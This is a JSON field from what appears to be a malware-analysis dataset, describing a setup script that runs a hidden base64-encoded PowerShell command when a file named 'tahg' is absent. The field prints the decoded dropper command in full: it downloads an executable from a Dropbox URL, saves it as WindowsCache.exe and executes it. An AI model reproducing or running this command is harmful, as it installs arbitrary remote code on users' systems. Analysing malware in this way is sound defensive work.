      "malicious_behavior": "This code is malicious. It attempts to execute a hidden PowerShell command using a base64-encoded payload if a file or directory named 'tahg' does not exist. The encoded PowerShell command decodes to: 'powershell Invoke-WebRequest -Uri \"https://dl.dropbox.com/s/szgnyt9zbu0qmv/Esquele.exe?dl=0\" -OutFile \"~/WindowsCache.exe\"; Invoke-Expression \"~/WindowsCache.exe\"'. This means the script downloads an executable file named 'Esquele.exe' from Dropbox, saves it as 'WindowsCache.exe' in the user's home directory, and then executes it. This behavior is typical of malware droppers, which are used to infect systems with further malicious payloads. The use of obfuscation (base64 encoding, hidden window, and misleading setup metadata) is intended to evade detection. This code can compromise the security of the system by running arbitrary code from the internet, potentially leading to data theft, system compromise, or further malware infection.",
